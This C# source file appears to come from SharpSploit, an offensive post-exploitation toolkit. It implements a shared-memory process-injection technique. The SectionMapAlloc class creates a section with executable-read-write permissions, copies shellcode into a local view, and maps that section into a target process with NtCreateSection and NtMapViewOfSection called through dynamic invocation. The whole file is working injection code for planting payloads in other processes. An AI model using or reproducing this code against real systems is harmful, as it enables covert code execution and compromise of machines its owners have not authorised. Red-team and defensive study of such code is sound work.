using System;
using System.Linq;

namespace SharpSploit.Execution.Injection
{
    /// <summary>
    /// Base class for allocation techniques.
    /// </summary>
    public abstract class AllocationTechnique
    {
        //An array containing a set of PayloadType objects that are supported.
        protected Type[] supportedPayloads;

        /// <summary>
        /// Informs objects using this technique whether or not it supports the type of a particular payload.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">A payload.</param>
        /// <returns>Whether or not the payload is of a supported type for this strategy.</returns>
        public abstract bool IsSupportedPayloadType(PayloadType payload);

        /// <summary>
        /// Internal method for setting the supported payload types. Used in constructors.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        abstract internal void DefineSupportedPayloadTypes();

        /// <summary>
        /// Allocate the payload to the target process at a specified address.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">The payload to allocate to the target process.</param>
        /// <param name="process">The target process.</param>
        /// <param name="address">The address at which to allocate the payload in the target process.</param>
        /// <returns>True when allocation was successful. Otherwise, throws relevant exceptions./returns>
        public IntPtr Allocate(PayloadType payload, System.Diagnostics.Process process, IntPtr address)
        {
            Type[] funcPrototype = new Type[] { payload.GetType(), typeof(System.Diagnostics.Process), address.GetType() };

            try
            {
                //Get delegate to the overload of Allocate that supports the type of payload passed in
                System.Reflection.MethodInfo allocate = this.GetType().GetMethod("Allocate", funcPrototype);

                //Dynamically invoke the appropriate Allocate overload
                return (IntPtr)allocate.Invoke(this, new object[] { payload, process, address });
            }
            //If there is no such method
            catch (ArgumentNullException)
            {
                throw new PayloadTypeNotSupported(payload.GetType());
            }
        }


        /// <summary>
        /// Allocate the payload to the target process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">The payload to allocate to the target process.</param>
        /// <param name="process">The target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public IntPtr Allocate(PayloadType payload, System.Diagnostics.Process process)
        {

            Type[] funcPrototype = new Type[] { payload.GetType(), typeof(System.Diagnostics.Process) };

            try
            {
                //Get delegate to the overload of Allocate that supports the type of payload passed in
                System.Reflection.MethodInfo allocate = this.GetType().GetMethod("Allocate", funcPrototype);

                //Dynamically invoke the appropriate Allocate overload
                return (IntPtr)allocate.Invoke(this, new object[] { payload, process });
            }
            //If there is no such method
            catch (ArgumentNullException)
            {
                throw new PayloadTypeNotSupported(payload.GetType());
            }
        }
    }

    /// <summary>
    /// Allocates a payload to a target process using locally-written, remotely-copied shared memory sections.
    /// </summary>
    public class SectionMapAlloc : AllocationTechnique
    {
        //Publically accessible options

        public uint localSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
        public uint remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
        public uint sectionAttributes = Win32.WinNT.SEC_COMMIT;

        /// <summary>
        /// Default constructor.
        /// </summary>
        public SectionMapAlloc()
        {

            DefineSupportedPayloadTypes();

        }

        /// <summary>
        /// States whether the payload is supported.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">Payload that will be allocated.</param>
        /// <returns></returns>
        public override bool IsSupportedPayloadType(PayloadType payload)
        {
            return supportedPayloads.Contains(payload.GetType());
        }

        /// <summary>
        /// Internal method for setting the supported payload types. Used in constructors.
        /// Update when new types of payloads are added.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        internal override void DefineSupportedPayloadTypes()
        {
            //Defines the set of supported payload types.
            supportedPayloads = new Type[] {
                typeof(PICPayload)
            };
        }

        /// <summary>
        /// Allocate the payload to the target process. Handles unknown payload types.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">The payload to allocate to the target process.</param>
        /// <param name="process">The target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public IntPtr Allocate(PayloadType payload, System.Diagnostics.Process process)
        {
            if (IsSupportedPayloadType(payload))
            {
                return Allocate(payload, process, IntPtr.Zero);
            }
            else
                throw new PayloadTypeNotSupported(payload.GetType());
        }

        /// <summary>
        /// Allocate the payload to the target process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">The PIC payload to allocate to the target process.</param>
        /// <param name="process">The target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public IntPtr Allocate(PICPayload payload, System.Diagnostics.Process process, IntPtr preferredAddress)
        {

            //Get a convenient handle for the target process.
            IntPtr procHandle = process.Handle;

            //Create a section to hold our payload
            IntPtr sectionAddress = CreateSection((uint)payload.Payload.Length, sectionAttributes);

            //Map a view of the section into our current process with RW permissions
            SectionDetails details = MapSection(System.Diagnostics.Process.GetCurrentProcess().Handle, sectionAddress,
                localSectionPermissions, IntPtr.Zero, Convert.ToUInt32(payload.Payload.Length));

            //Copy the shellcode to the local view
            System.Runtime.InteropServices.Marshal.Copy(payload.Payload, 0, details.baseAddr, payload.Payload.Length);

            //Now that we are done with the mapped view in our own process, unmap it
            Native.NTSTATUS result = UnmapSection(System.Diagnostics.Process.GetCurrentProcess().Handle, details.baseAddr);

            //Now, map a view of the section to other process. It should already hold the payload.

            SectionDetails newDetails;

            if (preferredAddress != IntPtr.Zero)
                newDetails = MapSection(procHandle, sectionAddress,
                    remoteSectionPermissions, preferredAddress, (ulong)payload.Payload.Length);
            //Attempt to allocate at a preferred address. May not end up exactly at the specified location.
            //Refer to MSDN documentation on ZwMapViewOfSection for details.
            else
                newDetails = MapSection(procHandle, sectionAddress,
                    remoteSectionPermissions, IntPtr.Zero, (ulong)payload.Payload.Length);

            return newDetails.baseAddr;
        }

        /// <summary>
        /// Creates a new Section.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="size">Max size of the Section.</param>
        /// <returns></returns>
        private static IntPtr CreateSection(ulong size, uint allocationAttributes)
        {
            //Create a pointer for the section handle
            IntPtr SectionHandle = new IntPtr();
            ulong maxSize = size;

            Native.NTSTATUS result = DynamicInvoke.Native.NtCreateSection(ref SectionHandle, 0x10000000, IntPtr.Zero, ref maxSize,
                Win32.WinNT.PAGE_EXECUTE_READWRITE, allocationAttributes, IntPtr.Zero);

            //Perform error checking on the result
            if (result >= 0)
                return SectionHandle;
            else
                return IntPtr.Zero;
        }

        /// <summary>
        /// Maps a view of a section to the target process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="procHandle">Handle the process that the section will be mapped to.</param>
        /// <param name="sectionHandle">Handle to the section.</param>
        /// <param name="protection">What permissions to use on the view.</param>
        /// <param name="addr">Optional parameter to specify the address of where to map the view.</param>
        /// <param name="sizeData">Size of the view to map. Must be smaller than the max Section size.</param>
        /// <returns>A struct containing address and size of the mapped view.</returns>
        public static SectionDetails MapSection(IntPtr procHandle, IntPtr sectionHandle, uint protection, IntPtr addr, ulong sizeData)
        {
            //Create an unsigned int to hold the value of NTSTATUS.
            UIntPtr ntstatus = new UIntPtr();

            //Copied so that they may be passed by reference but the original value preserved
            IntPtr baseAddr = addr;
            ulong size = sizeData;

            uint disp = 2;
            uint alloc = 0;

            //Returns an NTSTATUS value
            Native.NTSTATUS result = DynamicInvoke.Native.NtMapViewOfSection(sectionHandle, procHandle, ref baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref size, disp, alloc,
                protection);

            //Create a struct to hold the results.
            SectionDetails details = new SectionDetails(baseAddr, sizeData);

            return details;
        }


        /// <summary>
        /// Holds the data returned from NtMapViewOfSection.
        /// </summary>
        public struct SectionDetails
        {

            public IntPtr baseAddr;
            public ulong size;

            public SectionDetails(IntPtr addr, ulong sizeData)
            {
                baseAddr = addr;
                size = sizeData;
            }
        }

        /// <summary>
        /// Unmaps a view of a section from a process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="hProc">Process to which the view has been mapped.</param>
        /// <param name="baseAddr">Address of the view (relative to the target process)</param>
        /// <returns></returns>
        public static Native.NTSTATUS UnmapSection(IntPtr hProc, IntPtr baseAddr)
        {
            return (Native.NTSTATUS)DynamicInvoke.Native.NtUnmapViewOfSection(hProc, baseAddr);
        }
    }//end class
}